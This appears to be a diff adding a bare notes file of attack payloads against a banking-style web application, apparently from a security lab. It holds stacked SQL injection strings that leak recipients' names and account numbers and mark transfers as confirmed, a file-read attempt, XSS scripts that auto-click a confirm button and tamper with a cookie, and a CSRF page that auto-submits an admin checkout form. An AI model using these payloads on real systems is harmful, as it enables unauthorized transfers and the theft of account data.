@@ -1,0 +1,59 @@
+SQL INJECTION FIRST:
+
+title','Standard','200');UPDATE Przelewy SET Title = (SELECT GROUP_CONCAT(concat(a.Recipients_Name,',',a.Account_Number,',',a.Type_Of_Transfer) SEPARATOR ';') 
+FROM (SELECT * FROM Przelewy) AS a ) WHERE base_id = (SELECT b.base_id FROM (SELECT * FROM Przelewy) AS b
+INNER JOIN Users ON Users.User_id = b.id WHERE User_id = (SELECT User_id FROM Users
+WHERE User_name = 'Vargensan'));--
+
+SQL INJECTION SEC:
+
+title','Standard','200');UPDATE Przelewy SET Status = 'Confirmed' WHERE User_Num_Check = (SELECT MAX(b.User_Num_Check) FROM (SELECT * FROM Przelewy) AS b INNER JOIN Users ON Users.User_id = b.id WHERE User_id = (SELECT User_id FROM Users WHERE User_name = 'Vargensan'));--
+
+LOAD DATA INFILE '/home/sherlock/testdir/'
+
+ </label></div><script>"our script"</script> <label><div>
+ 
+ "our script" ->
+ document.getElementById("confirmbutton").addEventListener("click", myFunction);
+ #now change the content of the Title cookie
+ createCookie("Title","50 0000 0000 0000 0000 0000 0000",0,"/");
+ with Title =
+ "title','Standard','200');UPDATE Przelewy SET Status = 'Confirmed' WHERE User_Num_Check = (SELECT MAX(b.User_Num_Check) FROM (SELECT * FROM Przelewy) AS b INNER JOIN Users ON Users.User_id = b.id WHERE User_id = (SELECT User_id FROM Users WHERE User_name = 'Vargensan'));--"
+ 
+ XSS:
+ 
+ </label></div><script>
+	function changeContext(){
+		document.getElementById("aconf").click();
+	}
+	window.onload=changeContext;
+</script><div><label>
+
+</label></div><script>
+	function changeContext(){
+		document.getElementById("aconf").click();
+	}
+	window.onload=changeContext;
+</script><div><label>
+
+XSRF:
+
+
+<a href="page.html">Nothing Special</a>
+
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<form action="admincheckout.php" method="POST">
+<input type="submit" name="marked" id="hey">Fake Confirm</input>
+</form>
+</body>
+<script>
+	function execute(){
+		document.getElementById("hey").click();
+	}
+	window.onload=execute;
+</script>
+</html>
